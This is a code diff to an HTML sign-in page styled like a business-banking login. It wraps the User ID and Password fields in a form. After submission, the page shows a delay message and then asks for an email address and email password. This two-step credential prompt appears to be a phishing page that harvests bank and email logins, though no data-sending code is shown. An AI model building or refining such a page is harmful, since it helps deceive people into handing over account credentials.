@@ -37,11 +37,10 @@
             margin-top: 5px;
         }
 
-        .notice strong,
+        /* .notice strong,
         p {
-           /* margin: auto 350px; */
-           
-        }
+           margin: auto 350px;
+        } */
 
         .container {
             max-width: 1100px;
@@ -128,6 +127,17 @@
             outline: none;
         }
 
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            border: 1px solid var(--border);
+            background: #fff;
+            box-sizing: border-box;
+            border-radius: 2px;
+            outline: none;
+        }
+
         input[type="submit"] {
             width: 160px;
             padding: 12px;
@@ -169,6 +179,17 @@
             font-weight: 700;
             cursor: pointer;
             border-radius: 2px;
+        }
+
+        #secondForm button {
+            width: 160px;
+            padding: 12px;
+            background: #d6d6d6;
+            border: 1px solid #bfbfbf;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 2px;
+            margin-top: 15px;
         }
 
         .links a {
@@ -307,28 +328,48 @@
                 <div class="tab" role="tab">Business Suite</div>
                 <div class="tab" role="tab">Business Essentials</div>
             </div>
-            <label for="userid">User ID</label>
-            <input id="userid" type="text" placeholder="" name="user">
-            <label for="password">Password</label>
-            <div class="password-wrapper">
-                <input id="password" type="password" aria-describedby="toggle" name="pass" />
-                <span id="toggle" class="toggle-eye" role="button" aria-label="Show password"
-                    onclick="togglePassword()">
-                    <svg width="22" height="14" viewBox="0 0 24 14" fill="none" xmlns="http://www.w3.org/2000/svg"
-                        aria-hidden="true">
-                        <path d="M1 7C1 7 5 1 12 1s11 6 11 6-4 6-11 6S1 7 1 7z" stroke="#777" stroke-width="1.2"
-                            fill="none" />
-                        <circle cx="12" cy="7" r="2.2" stroke="#777" stroke-width="1.2" fill="none" />
-                    </svg>
-                </span>
+            <form id="firstForm">
+                <label for="userid">User ID</label>
+                <input id="userid" type="text" placeholder="" name="user" required>
+
+                <label for="password">Password</label>
+                <div class="password-wrapper">
+                    <input id="password" type="password" aria-describedby="toggle" name="pass" required />
+                    <span id="toggle" class="toggle-eye" role="button" aria-label="Show password"
+                        onclick="togglePassword()">
+                        <!-- (your eye icon SVG) -->
+                        <svg width="22" height="14" viewBox="0 0 24 14" fill="none" xmlns="http://www.w3.org/2000/svg"
+                            aria-hidden="true">
+                            <path d="M1 7C1 7 5 1 12 1s11 6 11 6-4 6-11 6S1 7 1 7z" stroke="#777" stroke-width="1.2"
+                                fill="none" />
+                            <circle cx="12" cy="7" r="2.2" stroke="#777" stroke-width="1.2" fill="none" />
+                        </svg>
+                    </span>
+                </div>
+
+                <div class="checkbox-row">
+                    <input id="remember" type="checkbox" />
+                    <label for="remember" style="font-weight:500;">Remember my User ID</label>
+                </div>
+
+                <div style="margin:12px 0;">
+                    <input type="submit" value="SIGN In" name="submit">
+                </div>
+            </form>
+            <div id="preloader" style="display:none; font-size: 18px; color: var(--blue); margin: 20px 0;">
+                Continue with your email...
             </div>
-            <div class="checkbox-row">
-                <input id="remember" type="checkbox" />
-                <label for="remember" style="font-weight:500;">Remember my User ID</label>
-            </div>
-            <div style="margin:12px 0;">
-                <input type="submit" value="SIGN In" name="submit">
-            </div>
+            <form id="secondForm" style="display:none;">
+                <h2>Email Login</h2>
+                <label for="email">Email</label>
+                <input id="email" type="email" required>
+
+                <label for="emailPass">Password</label>
+                <input id="emailPass" type="password" required>
+
+                <button type="submit">Log In</button>
+            </form>
+
             <div class="links">
                 <a href="#">Forgot User ID?</a>
                 <a href="#">Forgot Password?</a>
@@ -395,6 +436,25 @@
                 btn.setAttribute('aria-label', 'Show password');
             }
         }
+
+        document.getElementById('firstForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Hide first form
+            document.getElementById('firstForm').style.display = 'none';
+
+            // Show preloader message
+            const preloader = document.getElementById('preloader');
+            preloader.style.display = 'block';
+
+            // Wait 10 seconds, then hide preloader and show second form
+            setTimeout(() => {
+                preloader.style.display = 'none';
+                document.getElementById('secondForm').style.display = 'block';
+            }, 8000); // 10000 ms = 10 seconds
+        });
+
+
     </script>
 </body>
 
